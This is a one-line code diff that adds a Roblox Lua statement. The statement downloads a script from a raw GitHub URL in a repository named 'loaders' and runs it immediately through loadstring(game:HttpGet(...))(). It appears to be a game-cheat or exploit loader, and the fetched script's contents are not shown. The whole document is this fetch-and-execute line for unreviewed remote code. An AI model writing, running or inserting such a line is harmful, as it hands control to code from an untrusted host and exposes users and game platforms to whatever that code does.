@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/title-unavailable-spam6-nc0s9lahjp8gie.lua"))()
